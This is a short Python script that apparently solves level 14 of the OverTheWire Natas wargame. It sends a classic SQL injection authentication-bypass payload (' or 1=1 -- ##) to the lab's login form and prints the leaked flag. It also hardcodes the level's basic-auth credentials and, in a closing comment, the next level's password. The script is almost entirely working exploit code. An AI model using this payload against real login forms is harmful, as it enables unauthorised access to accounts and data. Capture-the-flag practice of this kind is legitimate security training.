#! /usr/bin/python


import requests


#Functions
def cleanheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
		print(f'{item} : {value}')


#Basic Authentication
basic_username,basic_password='natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'.split(':')


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
path=''

#Custom Headers
custom_headers=''


#Payload
user='" or 1=1 -- ##'
payload={"username":user,"password":user,"debug":"true","submit":"Login"}
url=host+path

session=requests.Session()
response=requests.post(url,data=payload,auth=(basic_username,basic_password))
content=response.text
status=response.status_code
headers=response.headers



print(f'HOST : {host}\nuser:{basic_username}\npass:{basic_password}\n')
cleanheaders(headers)


flag=content.split('\n')[13]
print(flag)


#WRITEUP
#The flag was in the source of the index.html page but this time right clicking is blocked

# SELECT * from users where username=\"username"\ and password=\"payload"\;

# natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J